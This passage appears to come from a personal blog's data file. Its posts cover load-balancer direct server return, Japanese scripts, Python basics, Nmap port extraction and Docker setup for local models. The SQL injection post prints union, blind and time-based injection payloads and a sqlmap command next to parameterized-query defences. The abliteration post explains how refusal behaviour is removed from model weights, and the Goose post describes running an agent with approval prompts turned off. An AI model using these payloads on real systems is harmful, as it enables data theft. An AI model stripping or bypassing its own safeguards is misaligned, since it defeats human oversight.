the Virtual IP (VIP) (e.g., <code>192.168.2.1</code>) is usually assigned to the load balancer to receive incoming traffic from clients. However, the same VIP is also configured on the server, typically as a loopback address (a virtual network interface).</li>\n<li>This setup allows the server to receive and process traffic sent to the VIP without needing to forward responses back through the load balancer.</li>\n</ul>\n</li>\n<li><strong>How the Server Uses the VIP</strong>:\n<ul>\n<li>When the load balancer forwards the packet to the server, the destination IP in the packet remains the VIP (e.g., <code>192.168.2.1</code>).</li>\n<li>Since the server has the VIP configured as a local loopback IP, it recognizes this as its own address and accepts the packet, even though the original request was made to the load balancer.</li>\n</ul>\n</li>\n<li><strong>Loopback Interface</strong>:\n<ul>\n<li>The server is configured to respond from the VIP, but instead of routing traffic back through the load balancer, it responds directly to the client using its own real IP address (e.g., <code>192.168.3.5</code>).</li>\n<li>The VIP is not tied to a physical network interface on the server. It’s typically assigned to a loopback interface (e.g., <code>lo:0</code>), allowing the server to handle traffic directed at the VIP.</li>\n</ul>\n</li>\n</ol>\n<p><strong>B. Why Does the Client Accept The Response?</strong>\nThe client <em>does not care</em> about the server's actual IP address (<code>192.168.3.5</code>).</p>\n<ul>\n<li>The client only looks at the <em>source IP</em> in the response packet. If the source IP in the response matches the <em>VIP</em> (<code>192.168.2.1</code>) that the client originally requested, the response appears valid to the client.</li>\n<li>The server ensures that the response packet has the <em>source IP as the VIP (<code>192.168.2.1</code>)</em>, so the client believes it is communicating with the original destination (VIP), even though the response is coming directly from the real server.</li>\n</ul>\n<p><strong>C. Why Doesn’t the Real Server’s IP Matter?</strong></p>\n<ul>\n<li>The server’s <strong>real IP</strong> (<code>192.168.3.5</code>) is only used internally between the load balancer and the server.</li>\n<li>For the client, the connection always appears to be with the <em>VIP</em> (<code>192.168.2.1</code>), as the client only sees the VIP in both the request and the response.</li>\n<li>The <em>server never exposes its real IP</em> (<code>192.168.3.5</code>) to the client directly. The client always receives the response with the VIP (<code>192.168.2.1</code>) as the source IP.</li>\n</ul>\n<p><strong>D. Can i use this technique to perform Man-In-The-Middle Attacks?</strong>\nThe answer is <strong>NO</strong>. In theory, using a <em>loopback address</em> to reply as someone else — might seem similar to how <em>Direct Server Return (DSR)</em> works in a <em>half-proxy</em> setup. However, there are several important differences and limitations that prevent this method from being used to impersonate another service (like Google) for malicious purposes or <em>Man-in-the-Middle (MITM)</em> attacks. Some of the reasons being:</p>\n<ol>\n<li><strong>Traffic Routing and Control</strong>:\n<ul>\n<li>In the half-proxy/DSR scenario, the reason the server can respond using the VIP (loopback address) is because:\n<ul>\n<li>The load balancer controls the initial routing, ensuring the client's request reaches the server.</li>\n<li>The VIP is assigned to the loopback interface on the server intentionally as part of a <em>trusted setup</em>.</li>\n</ul>\n</li>\n<li>If we were to assign a public IP (like Google’s) to our loopback interface, the internet's global routing infrastructure would still direct traffic to the real Google servers, not our machine. We cannot control external routing in this way, so we wouldn't receive the initial traffic to respond to.</li>\n</ul>\n</li>\n<li><strong>Source IP Validation (Anti-Spoofing)</strong>:\n<ul>\n<li>Modern networks and servers implement <strong>anti-spoofing measures</strong>. This means that if we try to send a response from a loopback address pretending to be another IP (like Google’s), routers, firewalls, and other devices on the network will likely <em>detect the spoofed IP address and discard the packet</em>.</li>\n<li>ISPs and network devices typically block traffic that claims to come from public IP ranges unless it is correctly routed from the owner of those IP addresses.</li>\n</ul>\n</li>\n<li><strong>No Real MITM Capability</strong>:\n<ul>\n<li>In a half-proxy/DSR setup, the server legitimately receives the client’s request from the load balancer. The server is authorized to handle and respond to that request.</li>\n<li>If we were trying to spoof traffic from another source (like Google), we’d have to somehow intercept or control the flow of requests intended for Google’s servers, which is extremely difficult without access to the underlying network.</li>\n<li>Simply assigning the same IP to our loopback interface won’t cause external traffic to be routed to our machine. Routers, DNS servers, and ISPs will ensure that the real Google IP traffic goes to the correct destination.</li>\n</ul>\n</li>\n<li><strong>TLS/SSL Encryption</strong>:\n<ul>\n<li><strong>HTTPS traffic</strong> (used by almost all major services like Google) is encrypted using TLS/SSL. Even if we were able to somehow intercept requests, we wouldn’t be able to impersonate the server because we wouldn’t have access to the required <strong>private keys</strong> to decrypt the traffic or properly respond. The client would detect this and <em>reject the response</em> as invalid.</li>\n</ul>\n</li>\n<li><strong>Network Security Protections (IP Source Guard)</strong>: - Many network devices use features like <strong>IP Source Guard</strong> and <strong>Unicast Reverse Path Forwarding (uRPF)</strong>, which verify that the source IP address in a packet matches the expected interface or network path. These mechanisms would flag and drop traffic from a spoofed IP (like using a loopback address to pretend to be another entity).\nSo, in the spoofing scenario:</li>\n</ol>\n<ul>\n<li><em>We have no way to get the initial traffic intended for a public service like Google unless we compromise network routing, which is not feasible without deep access to network infrastructure.</em></li>\n<li><em>Even if we spoof the source IP to try to impersonate Google or any other service, network security mechanisms and TLS encryption will prevent this from being successful.</em></li>\n</ul>","learning-japanese":"<h1>Unraveling the Wonders of Learning Japanese 🇯🇵</h1>\n<p>Konnichiwa, language enthusiasts! Embarking on a journey to learn Japanese is a thrilling adventure into a rich tapestry of linguistic wonders. In this blog post, we'll delve into the fascinating realms of Katakana, Hiragana, Kanji, and explore the theories that make the Japanese language a unique and intricate masterpiece.</p>\n<h2>Decoding the Scripts: Katakana, Hiragana, and Kanji</h2>\n<h3>Katakana: The Adventurous Wave</h3>\n<p>Katakana, with its bold and angular characters, is like the cool sibling of Hiragana. This script is primarily used for foreign words, brand names, and to add an international flair to the language. When you encounter words like \"coffee\" or \"pizza\" in Japanese, chances are they're written in Katakana.</p>\n<h3>Hiragana: The Gentle River</h3>\n<p>Hiragana, on the other hand, is a graceful syllabary often used for native Japanese words. Its flowing characters represent sounds, making it an essential script for constructing sentences, verb conjugation, and expressing a wide array of ideas. Mastering Hiragana is fundamental to unlocking the full potential of the language.</p>\n<h3>Kanji: The Art of Complexity</h3>\n<p>Enter the world of Kanji, the intricate logographic characters borrowed from Chinese. Kanji characters convey meaning and can represent entire words or concepts. While Katakana and Hiragana are phonetic, Kanji adds a layer of complexity with its symbolism. Learning Kanji is like deciphering a visual code, allowing you to delve deeper into Japanese literature, culture, and traditions.</p>\n<h2>Theories About the Japanese Language</h2>\n<h3>The Writing Systems: A Harmonious Trio</h3>\n<p>The coexistence of Katakana, Hiragana, and Kanji creates a harmonious balance in written Japanese. Each system serves a unique purpose, blending together seamlessly to form a rich and expressive language.</p>\n<h3>Pronunciation Peculiarities: The Art of Pitch Accent</h3>\n<p>Japanese pronunciation is nuanced, and pitch accent plays a crucial role. Unlike stress-based languages, Japanese employs pitch variations that can alter the meaning of words. Understanding pitch accent adds a musicality to spoken Japanese, enhancing your ability to communicate naturally.</p>\n<h3>Cultural Context: Politeness and Honorifics</h3>\n<p>The Japanese language reflects a deep cultural respect and politeness. Honorifics, such as \"-san\" and \"-sama,\" signify the speaker's level of respect for others. Politeness is ingrained in the language, shaping interpersonal communication and societal norms.</p>\n<h2>When to Use Each Script: Practical Applications</h2>\n<ul>\n<li><strong>Katakana:</strong> Ideal for foreign words, loanwords, and emphasizing specific terms.</li>\n<li><strong>Hiragana:</strong> Used for native Japanese words, grammatical elements, and verb conjugation.</li>\n<li><strong>Kanji:</strong> Employed to convey complex ideas, nouns, and specific names. Essential for deeper cultural and literary understanding.</li>\n</ul>\n<h2>Embrace the Journey</h2>\n<p>Learning Japanese is a dynamic exploration of linguistic artistry, cultural nuances, and historical depth. Embrace the journey, celebrate the diversity of scripts, and unlock the doors to a language that opens up a world of tradition, innovation, and connection.</p>\n<p>Ganbatte kudasai (がんばってください)! Best of luck on your Japanese learning adventure!</p>\n<blockquote>\n<p><strong>Note:</strong> <br>\n<em>You can find various notes along with Enku's personal handwritten notes and books in her <a href=\"https://indulimbu.com.np/\">official website</a> . Also, you can practise what you have learnt in her website. She has gamified the learning experience there.</em></p>\n</blockquote>","learning-python-1":"<h1>Mastering Python Basics: A Beginner's Guide</h1>\n<p>Welcome, future Python wizards! Prepare to embark on an exhilarating journey into the world of Python programming. Python, often hailed as the Swiss Army knife of programming languages, awaits your exploration. Fear not, for we shall guide you through the essential concepts with clarity and excitement!</p>\n<h2>Unraveling Python's Magic</h2>\n<blockquote>\n<p>\"Python is like a magic wand in the hands of a programmer.\" - Unknown</p>\n</blockquote>\n<p>Before we delve into the enchanting realm of Python, let's unravel its magic. Python is a high-level, interpreted language renowned for its simplicity and readability. It serves as the backbone for a myriad of applications, from web development to scientific computing.</p>\n<h2>Let's Get Started!</h2>\n<h3>Installing Python: Your First Spell</h3>\n<p>Embarking on your Python journey begins with installing the Python interpreter. Fear not, for this incantation is simpler than you think!</p>\n<ul>\n<li><strong>Windows/Mac/Linux</strong>: Journey to the <a href=\"https://www.python.org/\">official Python realm</a>, and there, download the latest version of Python. Follow the instructions provided by the Python wizards to complete your installation.</li>\n</ul>\n<p>Once Python has found its abode on your machine, let's summon the Python spirits and cast our very first spell!</p>\n<h3>Casting Your First Spell: The Sacred \"Hello, Python!\"</h3>\n<p>In the world of Python, even the simplest spells can conjure great wonders. Behold, the sacred \"Hello, Python!\" incantation:</p>\n<pre><code class=\"language-python\">print(\"Hello, Python!\")\n</code></pre>\n<p>Cast this spell within a Python script file, such as <code>hello.py</code>, and invoke it using the following command:</p>\n<pre><code class=\"language-bash\">python hello.py\n</code></pre>\n<h3>Behold the Magic: Exploring Python Basics</h3>\n<p>With your journey initiated, let us traverse the realms of Python's fundamental concepts, where magic and logic intertwine seamlessly.</p>\n<h4>Variables and Data Types: The Potions of Python</h4>\n<p>In the alchemical laboratory of Python, variables and data types are the potions that shape reality. Let us unveil a table of mystical data types:</p>\n<p>| Data Type    | Description                  | Example                       |\n|</p>","networking-basics-1":"<p>Welcome, friends, to the fascinating realm of computer networking. In this networking series, we will embark on an exciting journey to understand networking. Today we will start by exploring the intricates of the TCP/IP and OSI models, exploring each layer's functions, protocols, and real-world examples. Prepare to dive deep into the world of networking as we unravel its mysteries together!</p>","nmap-for-cpts":"<h2>1. The Philosophy of Enumeration</h2>\n<p>Scanning is the process of sending a specific probe (a packet with certain flags) and observing the response. The \"State\" Nmap reports is simply an interpretation of that response based on RFC standards. If a firewall sits in the middle, it \"lies\" or \"silences\" the conversation, which is why Nmap has complex states like <code>open|filtered</code>.</p>","sql-injection-101":"<p>SQL injection is still in the OWASP Top 10 after decades. Not because it's hard to fix — because it's easy to miss. User input meets database query. No validation. Game over.</p>\n<p><ideanode color=\"pink\"><strong>The one-line fix:</strong> parameterized queries. Everything else in this post is understanding <em>why</em> that matters.</ideanode></p>\n<h2>The Three Attack Types</h2>\n<accordion title=\"1. In-Band (Classic) — attacker sees results directly\" color=\"#ff2d95\">\n<p>The attacker uses the same channel to launch the attack and read results. Data appears in the web page.</p>\n<p><strong>Union-based example — extracting credentials:</strong></p>\n<pre><code class=\"language-sql\">-- Original query behind the scenes:\nSELECT title FROM products WHERE id=1\n\n-- Attacker injects:\n' UNION SELECT username, password FROM users--\n</code></pre>\n<p>Response leaks usernames and passwords directly in the product title field.</p>\n</accordion>\n<accordion title=\"2. Blind (Inferential) — attacker infers from behavior\" color=\"#0055ff\">\n<p>No data is returned visibly. The attacker asks True/False questions and watches how the app responds.</p>\n<p><strong>Boolean-based — check one character at a time:</strong></p>\n<pre><code class=\"language-sql\">' AND SUBSTRING((SELECT Password FROM Users WHERE Username=\"admin\"),1,1)=\"a\"\n</code></pre>\n<p>If the page renders: first char is \"a\". If blank page: it's not. Automate this and you extract the entire password.</p>\n<p><strong>Time-based — use SLEEP():</strong></p>\n<pre><code class=\"language-sql\">' AND IF(SUBSTRING(password,1,1)=\"a\", SLEEP(10), 0)\n</code></pre>\n<p>If the response takes 10 seconds — character confirmed. No visible difference needed.</p>\n</accordion>\n<accordion title=\"3. Out-of-Band (OAST) — attacker gets data via external channel\" color=\"#ff6600\">\n<p>Rare but powerful. Forces the database to make DNS/HTTP requests to an attacker-controlled server carrying exfiltrated data. Works when the app shows nothing and timing is unreliable.</p>\n</accordion>\n<p>&#x3C;InteractiveCode\ndefaultLanguage=\"typescript\"\ndefaultValue={`// The ONLY correct way to query a database\n// Parameterized queries — never string concatenation</p>\n<p>// WRONG — vulnerable to injection:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;</p>\n<p>// RIGHT — parameterized:\nconst query = \"SELECT * FROM users WHERE id = ?\";\ndb.execute(query, [userId]);</p>\n<p>// In Node.js with mysql2:\nimport mysql from 'mysql2/promise';\nconst [rows] = await connection.execute(\n'SELECT * FROM users WHERE username = ? AND password = ?',\n[username, password]\n);\n`}\n/></p>\n<h2>Detection Checklist</h2>\n<accordion title=\"How to spot SQLi during testing\" color=\"#00cc55\">\n<p><strong>Quick tests:</strong></p>\n<ol>\n<li>Add <code>'</code> to a parameter — look for database errors</li>\n<li>Try <code>' OR '1'='1</code> — does it return all rows?</li>\n<li>Add <code>' AND SLEEP(5)--</code> — does the response delay?</li>\n<li>Try boolean pairs: <code>' AND 1=1--</code> vs <code>' AND 1=2--</code> — different responses?</li>\n</ol>\n<p><strong>Tools:</strong></p>\n<pre><code class=\"language-bash\">sqlmap -u \"http://target.com/page.php?id=1\" --dbs\n</code></pre>\n<p>&#x3C;CopyButton text={<code>sqlmap -u \"http://target.com/page.php?id=1\" --dbs</code>} label=\"Copy sqlmap\" /></p>\n</accordion>\n<p>&#x3C;QuizCard\ntitle=\"SQLi Quick Quiz\"\ncolor=\"#ff2d95\"\nquestions={[\n{\nquestion: \"Which SQLi type never shows data in the response?\",\noptions: [\"Blind SQLi\", \"Union-based SQLi\", \"Error-based SQLi\", \"Stacked queries\"],\ncorrect: 0,\nexplanation: \"Blind SQLi infers data from application behavior (true/false, timing) rather than seeing it directly in the response.\"\n},\n{\nquestion: \"What's the single best defense against SQL injection?\",\noptions: [\n\"Parameterized queries / prepared statements\",\n\"Input sanitization with regex\",\n\"Web Application Firewall\",\n\"Escaping single quotes\"\n],\ncorrect: 0,\nexplanation: \"Parameterized queries separate code from data at the database driver level — no amount of escaping can beat that. Everything else is a bandage.\"\n}\n]}\n/></p>","tutorialhell":"<h2>Defining Tutorial Hell</h2>\n<p>Tutorial hell is when you're stuck in a loop of endlessly watching or reading tutorials without really understanding or getting better at what you're trying to learn. It's like being on a learning treadmill but not moving forward.</p>\n<h2>Consequences and Disadvantages</h2>\n<p>Being stuck in tutorial hell can be frustrating. It means you might not really know what you're doing, even after going through lots of tutorials. The problems with this are:</p>\n<ul>\n<li>\n<p>Lack of Direction: You might feel lost because you didn't set clear goals for what you want to achieve.</p>\n</li>\n<li>\n<p>Not Really Learning: Just watching or reading without practicing doesn't help you remember or use what you've learned.</p>\n</li>\n<li>\n<p>Too Many Tutorials: There are so many tutorials online that it's easy to get overwhelmed. But watching too many on the same topic can make things confusing.</p>\n</li>\n</ul>\n<h2>Impact of Tutorial Hell</h2>\n<p>Being in tutorial hell can slow down your progress. If you're not actively applying what you've learned, it's like trying to run a race but never leaving the starting line.</p>\n<h2>Ways to Get Out of Tutorial Hell</h2>\n<ol>\n<li>\n<p>Set Clear Goals: Decide what you want to achieve and break it into smaller, doable goals. It helps you know where you're going.</p>\n</li>\n<li>\n<p>Do Real Projects: Instead of just learning, try working on real projects. It's like learning to ride a bike by actually riding, not just reading about it.</p>\n</li>\n<li>\n<p>Teach What You Learn: Explain what you've learned, even if it's just to yourself. Teaching helps you understand things better.</p>\n</li>\n<li>\n<p>Build a Learning Routine: Have a regular time for learning. It makes things easier to remember and keeps you on track.</p>\n</li>\n<li>\n<p>Join Others: Connect with people who are learning the same things. It's like having teammates on your learning journey.</p>\n</li>\n<li>\n<p>Take Breaks and Think: Don't forget to take breaks. Reflect on what you've learned, celebrate small victories, and don't be too hard on yourself.</p>\n</li>\n<li>\n<p>Think of Challenges as Opportunities: Don't give up when things get hard. See challenges as chances to get better. You're growing, not stuck.</p>\n</li>\n</ol>\n<p><em>In simple terms, escaping tutorial hell means being smart about how you learn. Set goals, practice what you learn, and don't forget to enjoy the journey. It's like finding the right path instead of going in circles.</em></p>","abliteration-model-variants":"<p>When I was setting up my local security research stack, I kept seeing model names like \"Qwen3.6-27B-Uncensored-HauhauCS-Aggressive\" and \"Heretic-something\" and had no idea what the suffix meant beyond \"probably has no content filters.\" Here's what's actually happening.</p>\n<h2>What safety training is</h2>\n<p>When a foundation model gets trained (Qwen, LLaMA, Mistral, etc.), the base model is then fine-tuned on a second stage called RLHF (Reinforcement Learning from Human Feedback) or DPO (Direct Preference Optimization). During this stage, human raters mark certain responses as good (helpful, harmless) and others as bad (refusals of legitimate requests, harmful outputs).</p>\n<p>The result is a model that has a learned \"refusal direction\" — a pattern in its activations that triggers when it recognizes certain request types and routes toward a refusal response. This is intentional. It's what makes a commercial model say \"I can't help with that.\"</p>\n<p>The problem for security research: the refusal triggers are pattern-matched, not context-aware. A model trained to refuse \"how do I exploit X\" also refuses legitimate security research questions, vulnerability analysis, exploit chain documentation, and anything that looks vaguely offensive-security-adjacent. If you're doing authorized penetration testing and need the model to help write a Burp extension or analyze a deserialization gadget chain, you'll hit the refusal wall constantly.</p>\n<h2>What abliteration does</h2>\n<p>Abliteration is a technique from representation engineering research. The idea: instead of retraining the model to remove specific fine-tuning, you identify where the refusal direction lives in the model's activation space and surgically remove it.</p>\n<p>The process in general terms:</p>\n<ol>\n<li>Run the model on many \"harmful\" request examples and many \"harmless\" examples</li>\n<li>Compare the activation patterns — find the direction in activation space that separates refused from non-refused content</li>\n<li>Project out that direction from the model's weight matrices — orthogonalize the weights against the refusal direction</li>\n<li>The model loses its ability to refuse along that dimension</li>\n</ol>\n<p>It's less like \"deleting the safety system\" and more like removing a specific concept from the model's internal representation. The model doesn't become malicious or incoherent — it just stops having the refusal reflex. It behaves more like the base model before RLHF.</p>\n<p>The original public implementation was done by mlabonne on HuggingFace. The technique was documented and the code open-sourced, which is why community model variants using it proliferated quickly.</p>\n<h2>HauhauCS and Heretic — what these model families are</h2>\n<p><strong>HauhauCS</strong> models are a series of community fine-tunes that combine abliteration (removing refusal behavior) with additional fine-tuning for more direct, assertive responses. The \"Aggressive\" suffix means it's been tuned to respond without hedging, without disclaimers, and without the constant \"please note that...\" padding that safety-tuned models add. For security research prompts, this is genuinely better — you want the model to just analyze the thing, not spend half the response warning you about it.</p>\n<p><strong>Heretic</strong> models (by Doctor Shotgun and related community contributors) take a similar approach but tend to focus more on removing specific RLHF artifacts — the over-cautious phrasing, the refusal to engage with hypotheticals, the automatic \"as an AI, I cannot\" canned responses. The heretic naming is a bit tongue-in-cheek — the model is \"heretical\" to the safety orthodoxy.</p>\n<p>Both families layer on top of base models (Qwen, LLaMA, Mistral) and the quality of the underlying base model carries through. A HauhauCS fine-tune of Qwen3.6 is still Qwen3.6's architecture and training — just without the refusal layer and with some behavior adjustments.</p>\n<h2>The actual tradeoffs</h2>\n<p><strong>What you gain:</strong> The model actually engages with security research questions. It'll analyze exploit chains, discuss vulnerability classes, help write detection scripts, reason about attack vectors. For authorized security work, this is necessary functionality, not a bug.</p>\n<p><strong>What you lose:</strong> The model is less careful about context. A safety-tuned model adds \"make sure you have authorization before testing\" reminders and similar safeguards. An abliterated model just answers. The moral guardrails are gone — the responsibility for using it appropriately is entirely on you.</p>\n<p><strong>Quality impact:</strong> Abliteration can slightly degrade coherence on edge cases, especially if the removal was done too aggressively. The \"Aggressive\" tag in HauhauCS refers to the directness of behavior, but there is a version where removing too much from the activation space causes the model to occasionally get confused. Better-quality abliterations are targeted — remove the refusal direction without touching unrelated capabilities. Most community models are reasonably careful about this.</p>\n<p><strong>Factual accuracy:</strong> Unchanged. Abliteration doesn't affect the model's knowledge or reasoning — just its willingness to apply that reasoning to certain topics.</p>\n<h2>Why this matters for the project</h2>\n<p>Running a standard safety-tuned model for security research is genuinely painful. Asking it to analyze a CVE reproduction PoC gets a refusal. Asking it to generate a nuclei template for a known vulnerability gets hedged responses with warnings. Asking it to think through an exploit chain gets \"I'm not able to assist with potentially harmful activities.\"</p>\n<p>For authorized bug bounty work against targets you have explicit permission to test, you need a model that just... does the thing. The HauhauCS variant was the practical choice.</p>\n<p>The ethics of this are: it's your machine, your model, your responsibility for how you use it. The same way you can compile Metasploit without Rapid7 judging what targets you run it against, you can run an abliterated model without the model second-guessing your authorization status. The tool doesn't confer authorization — that's between you and the target.</p>\n<h2>One more thing — the mmproj file</h2>\n<p>The models I used came with an mmproj (multimodal projector) file — that's the vision encoder adapter. This is a separate fine-tuned component that maps image embeddings into the same space as text tokens, allowing the model to \"see\" images. Super useful for security research: screenshot a web app's response headers, feed it to the model, get analysis without copy-pasting. Standard llama.cpp loads it with <code>--mmproj path/to/mmproj.gguf</code>.</p>","ai-agents-goose":"<p>An AI agent is an LLM that can do things. That's the whole definition. The \"agent\" part is just the scaffolding that gives the LLM hands.</p>\n<h2>The octopus theory</h2>\n<p>Here's the mental model that finally made it click for me.</p>\n<p>The LLM is a brain. Smart, knowledgeable, can reason through complex problems. But it has no body. It can't pick things up, can't look at the world, can't press buttons. It can only think and talk.</p>\n<p>An agent framework is the body. It takes the brain's decisions and executes them in the real world. But the interesting part is you can attach <em>any limbs you want</em>.</p>\n<p>Want the brain to run terminal commands? Attach a terminal arm. Want it to browse the web? Attach a browser arm. Want it to remember things between sessions? Attach a memory organ. Want it to query a database? Database tentacle. Spawn other agents? Another brain in the same body.</p>\n<p>The octopus analogy is apt because octopi have 8 limbs that can each act semi-independently, and their brain architecture actually delegates some intelligence to each arm. Your agent can have 20 tools and the model picks which ones to use, in what order, based on what the task needs. Very octopus-y.</p>\n<h2>What actually happens in an agentic loop</h2>\n<p>When you give Goose a task, here's what happens under the hood:</p>\n<ol>\n<li>Goose builds a system prompt that includes: your <code>.goosehints</code> file, descriptions of all available tools, any active skill files, and memory from previous sessions</li>\n<li>Your message gets added to the conversation</li>\n<li>That whole thing gets sent to the LLM (in my case, via llama.cpp's OpenAI-compatible API)</li>\n<li>The LLM responds with either: a text reply, or a tool call (structured JSON requesting a specific tool with specific parameters)</li>\n<li>If it's a tool call, Goose executes it — runs the shell command, queries Qdrant, fetches the URL, whatever</li>\n<li>The result gets added to the conversation</li>\n<li>Back to step 3 — the LLM sees the result and decides what to do next</li>\n<li>Repeat until the LLM produces a final text response with no more tool calls</li>\n</ol>\n<p>This loop is the \"agentic\" part. The LLM isn't just answering once and stopping — it's reasoning, acting, observing the results, and deciding what to do next. More like a person working through a problem than a search engine returning an answer.</p>\n<h2>Goose specifically</h2>\n<p>Goose is built by the Block (formerly Square) team, now under the Linux Foundation's AAIF. It's one of the most MCP-complete implementations — supports all transport types, handles parallel tool calls, has subagent spawning via the <code>summon</code> extension, can run multiple sessions via <code>orchestrator</code>.</p>\n<p>The extensions in Goose map directly to capabilities:</p>\n<ul>\n<li><code>developer</code> → terminal and file access (the most important one)</li>\n<li><code>memory</code> → writes notes to disk that survive session resets</li>\n<li><code>summon</code> → spawns subagents that can work in parallel</li>\n<li><code>computercontroller</code> → browser automation, web scraping</li>\n<li>MCP stdio servers → anything else you wire up</li>\n</ul>\n<p>The model never directly controls anything. Goose is the intermediary. The LLM says \"call shell with <code>nmap -p 80,443 target</code>\", Goose executes it, Goose returns the output, the LLM decides what to do with that output.</p>\n<h2>Goose vs Hermes</h2>\n<p>Hermes Agent (Nous Research, February 2026) is the other name that comes up. It's interesting — the focus is on self-improvement, where the agent can modify its own prompts and skills based on what works. The GitHub stars exploded fast.</p>\n<p>But it's very new. The MCP ecosystem around it is thin, the security model isn't mature (no sandbox mode, no prompt injection detection), and the documentation is sparse. For a workflow that needs stable tool execution with real commands, Goose is more battle-tested.</p>\n<p>Hermes Agent's self-improvement loop is genuinely cool as a concept — imagine an agent that gets better at your specific workflow over time. That's worth watching. Just not ready for \"run terminal commands on my machine\" use yet.</p>\n<h2>The skills system</h2>\n<p>Skills (SKILL.md files in <code>~/.config/agents/skills/</code>) are instruction files that get loaded based on relevance. At startup Goose reads only the frontmatter (tiny — just name and description). When you start a task matching a skill's description, the full skill loads.</p>\n<p>So a <code>web-hunter/SKILL.md</code> with description \"web application security testing — XSS, SQLi, IDOR on authorized targets\" gets loaded when you mention an HTTP target. The model suddenly has a detailed methodology it didn't have before, without you typing it out every session.</p>\n<p>Think of skills as the muscle memory of your octopus. The brain doesn't have to rediscover how to recon a web target from first principles every time — the skill file encodes the methodology and it's available on demand.</p>\n<h2>What GOOSE_MODE controls</h2>\n<p><code>smart_approve</code> — Goose pauses before \"risky\" shell commands and asks if you want to proceed. Good for demos, infuriating for autonomous work.</p>\n<p><code>auto</code> — fully autonomous, runs everything without stopping. This is what you want when you've kicked off a task and walked away.</p>\n<p>The <code>GOOSE_CLI_MIN_PRIORITY</code> setting controls which tool calls Goose bothers asking about vs just does. At <code>0.0</code>, it executes everything. Raising it filters out low-priority operations.</p>\n<h2>The Telegram integration angle</h2>\n<p><code>goose gateway start telegram</code> runs Goose as a Telegram bot. Each Telegram user gets their own session. You send a message to the bot, the agentic loop runs on your machine, results come back to Telegram.</p>\n<p>It's genuinely useful. Kick off a long scan from your phone, come back to results. The bot persists on your machine; you just need to keep the systemd service running.</p>\n<p>The security model is Telegram authentication — only people who know the bot exist and can message it. Not exposed to the public internet. For a private research machine on a VM, that's fine.</p>","automate-nmap-port-copy-to-clipboard":"<p>The most annoying 10 seconds in pentesting: manually copying port numbers from an Nmap scan into the next service enumeration command.</p>\n<pre><code class=\"language-bash\"># Discovery scan finishes\nNmap done: 1 host up, ports: 22,80,110,139,143,445,31337\n\n# Then you manually type:\nsudo nmap -p 22,80,110,139,143,445,31337 ...  # ugh\n</code></pre>\n<p>Not anymore. A ZSH function + Nmap's grepable output + clipboard = instant.</p>\n<p><ideanode color=\"green\">Parse the scan output while it runs. Extract ports. Sort. Copy. All in one command.</ideanode></p>\n<h2>How it works</h2>\n<ol>\n<li><strong>Nmap <code>-oG</code> flag</strong> — writes grepable format to a temp file. One line per host, machine-parseable. Your terminal output stays human-readable.</li>\n<li><strong>Regex <code>\\d+(?=/open)</code></strong> — extracts digits before \"/open\". Only open ports. Closed/filtered ports ignored.</li>\n<li><strong>Sort unique → comma-join → clipboard</strong> — <code>sort -u -n | paste -sd \",\" | wl-copy</code></li>\n</ol>\n<p>&#x3C;InteractiveCode defaultLanguage=\"bash\" defaultValue={`nscan() {\nlocal target=\"$1\"\nshift\nlocal tmpfile=\"/tmp/nmap_grep_output.gnmap\"</p>\n<pre><code># Run Nmap normally — user sees standard output\n# Grepable output silently written to tmpfile\nsudo nmap \"$target\" \"$@\" -oG \"$tmpfile\"\n\n# Extract open ports → clipboard\nif [[ -f \"$tmpfile\" ]]; then\n    local ports=$(sudo grep -oP '\\\\d+(?=/open)' \"$tmpfile\" \\\n        | sort -u -n \\\n        | paste -sd \",\" - \\\n        | tr -d '\\\\n')\n    \n    if [[ -n \"$ports\" ]]; then\n        echo \"$ports\" | wl-copy\n        echo \"Ports [$ports] copied to clipboard\"\n    fi\n    sudo rm \"$tmpfile\"\nfi\n</code></pre>\n<p>}\n`} /></p>\n<accordion title=\"Example run\" color=\"#00cc55\">\n```bash\n$ nscan 10.129.2.49 -p- --min-rate 5000\n<h1>... Nmap output scrolls normally ...</h1>\n<p>Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds\nPorts [22,80,110,139,143,445,31337] copied to clipboard</p>\n<h1>Immediately paste into your next command:</h1>\n<p>$ sudo nmap -p [Ctrl+V] ...  # → -p 22,80,110,139,143,445,31337</p>\n<pre><code>&#x3C;/Accordion>\n\n## Why this matters\n\nThat 10-second fumble between discovery and service enumeration adds up. Over 100 scans in an engagement, that's 15+ minutes of manual copy-paste. This is zero seconds. Scan finishes → ports are in clipboard → paste into next command.\n\n&#x3C;CopyButton text=\"sudo nmap -p- --min-rate 5000 -oG /tmp/nmap.gnmap\" label=\"Copy full-port scan\" />\n\nPut the function in `~/.zshrc` and you never think about port extraction again.\n</code></pre></accordion>","docker-compose-ai-agent":"<h2>Docker Compose file to run open WebUI and AI Agents</h2>\n<p>Today I learned about Docker Compose file to run open WebUI and AI Agents just by downloading gguf files from platforms like <a href=\"https://huggingface.co\">hugging face</a>.</p>\n<h2>What are gguf files?</h2>\n<p>GGUF files are a special type of file format used to store and run large language models efficiently. They help make these models faster to load and easier to use on regular computers.</p>\n<h2>Actual docker compose file</h2>\n<pre><code class=\"language-yaml\">\nservices:\n  llama-server:\n    image: ghcr.io/ggml-org/llama.cpp:server\n    container_name: llama-server\n    restart: unless-stopped\n    volumes:\n      - /home/user/models:/models \n    ports:\n      - \"8080:8080\"\n    command: \n      - \"--models-dir\"\n      - \"/models\"\n      - \"--host\"\n      - \"0.0.0.0\"\n      - \"--port\"\n      - \"8080\"\n      - \"--ctx-size\"\n      - \"2048\"\n      - \"--parallel\"\n      - \"4\"\n\n  open-webui:\n    image: ghcr.io/open-webui/open-webui:latest\n    container_name: open-webui\n    restart: unless-stopped\n    ports:\n      - \"3001:8080\"\n    environment:\n      - OPENAI_API_BASE_URL=http://llama-server:8080/v1\n      - OPENAI_API_KEY=sk-no-key-required\n    volumes:\n      - open-webui-data:/app/data\n    depends_on:\n      - llama-server\n\nvolumes:\n  open-webui-data:\n\n</code></pre>\n<h3>Basic Explanation</h3>\n<p>This docker-compose file runs two services:</p>\n<ol>\n<li><strong>llama-server</strong>: This service runs a llama.cpp server that provides access to the models stored in the <code>/models</code> directory.</li>\n<li><strong>open-webui</strong>: This service runs the Open WebUI application, which provides a user interface for interacting with the models.</li>\n</ol>\n<h3>How to use</h3>\n<ol>\n<li>Download the gguf files from <a href=\"https://huggingface.co\">hugging face</a>.</li>\n<li>Place the gguf files in the <code>/models</code> directory.</li>\n<li>Run the docker-compose file.</li>\n<li>Open the Open WebUI application in your browser.</li>\n<li>Select the model you want to use.</li>\n<li>Start 